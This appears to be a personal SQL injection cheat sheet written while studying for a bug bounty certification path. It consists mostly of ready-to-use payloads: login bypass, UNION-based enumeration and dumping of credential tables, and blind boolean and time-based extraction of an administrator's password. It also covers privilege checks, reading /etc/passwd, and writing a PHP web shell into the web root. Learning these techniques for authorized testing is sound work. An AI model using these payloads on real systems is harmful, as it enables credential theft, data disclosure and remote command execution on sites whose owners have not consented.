# CBBH PATH
# SQL Injection Cheat Sheet

## Cheat Sheet Reference
[SQL Injection Cheat Sheet by PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Finding the Vulnerable Query
- Check the URL after parameters, e.g., `?Abdullah=Abdullah`.
- Test login fields for potential injection points.

## Fixing the Query (Comments)
- Use `--` or `#` for comments in SQL queries.

## Common Payloads
```sql
' or 1=1 --
'--
```

## String Concatenation
```sql
' UNION SELECT NULL, username || '*' || password FROM users--
```

## Determining the Number of Columns
Using `UNION`:
- Ensure the number and order of columns match in all queries.
- Data types must be compatible.
```sql
cn' UNION SELECT NULL, NULL, NULL-- -
cn' UNION SELECT NULL, NULL, NULL, NULL-- -
UNION SELECT NULL, NULL, NULL, NULL FROM Abdullah-- -
```
Using `ORDER BY`:
```sql
' ORDER BY 1-- -
```

## Finding a Column Containing Text (Data Type)
- An error indicates the column is not a string type.
- No error indicates the column is a string type.
```sql
cn' UNION SELECT NULL, 'Abdullah', NULL, NULL-- -
UNION SELECT username, NULL, NULL, 'Abdullah' FROM Abdullah-- -
```

## Database Enumeration
- Fingerprint MySQL:
```sql
SELECT @@version;
SELECT SLEEP(5);
```
- Current database name:
```sql
cn' UNION SELECT 1, database(), 2, 3-- -
```
- List all databases:
```sql
cn' UNION SELECT 1, schema_name, 3, 4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```
- List all tables in a specific database:
```sql
cn' UNION SELECT 1, TABLE_NAME, TABLE_SCHEMA, 4 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='dev'-- -
```
- List all columns in a specific table:
```sql
cn' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='credentials'-- -
```
- Dump data from a table in another database:
```sql
cn' UNION SELECT 1, username, password, 4 FROM dev.credentials-- -
```

## Blind SQL Injection
### Finding Vulnerable Parameters (Conditional Responses)
- Look for identifiable responses from the web app, e.g., a welcome message.
- Test conditions:
```sql
' AND 1=1--  -- True query
' AND 1=0--  -- False query
```

### Confirm a Table Exists (Conditional Responses)
```sql
' AND (SELECT 'x' FROM users LIMIT 1)='x'--
```

### Confirm a Username Exists in a Table (Conditional Responses)
```sql
' AND (SELECT username FROM users WHERE username='administrator' LIMIT 1)='administrator'--
```

### Enumerating a Password (Conditional Responses)
1. Determine password length:
```sql
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--
```
2. Extract each character sequentially:
```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

### Time-Based Blind SQL Injection
- Introduce time delays:
```sql
' || (SELECT pg_sleep(10))--
```
- Confirm table existence:
```sql
' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```
- Determine password length:
```sql
' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```
- Extract each character sequentially:
```sql
' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```

## Privilege Escalation
- Find current user:
```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```
- Check for admin privileges:
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
- Enumerate all user privileges:
```sql
cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
- Access directories via MySQL:
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
```

## File Injection
- Read local file:
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
- Write to a local file:
```sql
SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt';
```
- Write a web shell:
```sql
cn' UNION SELECT "",'<?php system($_REQUEST[Abdullah]); ?>', "", "" INTO OUTFILE '/var/www/html/shell.php'-- -
```

